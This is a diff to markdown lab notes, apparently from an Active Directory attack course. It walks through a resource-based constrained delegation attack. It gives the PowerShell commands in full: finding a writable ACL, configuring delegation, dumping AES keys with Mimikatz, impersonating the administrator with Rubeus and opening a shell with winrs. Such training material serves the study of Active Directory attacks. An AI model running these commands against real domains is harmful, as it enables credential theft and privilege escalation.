@@ -254,22 +254,37 @@ _To abuse RBCD_ in the most effective form, we just need two privileges:
 __Attack__
 - User 'ciadmin' has Write permissions over the dcorp-mgmt machine!
 ```powershell
-
-```
 Find-InterestingDomainACL | ?{$_.identityreferencename -
 match 'ciadmin'}
+```
 
 - Using the AD module, configure RBCD on dcorp-mgmt for student machines :
 ```powershell
 $comps = 'dcorp-student1$','dcorp-student2$'
 ```
-
+- We are delegating student machine to impersonate as any user on `dcorp-mgmt`
 ```powershell
 Set-ADComputer -Identity dcorp-mgmt 
 -PrincipalsAllowedToDelegateToAccount $comps
 ```
 
-- Now, let's get the privileges of dcorp-studentx$ by extracting its AES
-keys:
+- Now, let's get the privileges of dcorp-studentx$ by extracting its AES keys:
+```powershell
 Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
+```
+
+- Use the AES key of dcorp-studentx$ with Rubeus and access dcorp- mgmt as ANY user we want:
+```powershell
+Rubeus.exe s4u /user:dcorp-student1$
+/aes256:d1027fbaf7faad598aaeff08989387592c0d8e0201ba453d
+83b9e6b7fc7897c2 /msdsspn:http/dcorp-mgmt
+/impersonateuser:administrator /ptt
+```
+- Login with _admin TGT_
+```powershell
+winrs -r:dcorp-mgmt cmd.exe
+```
+
+
+
 
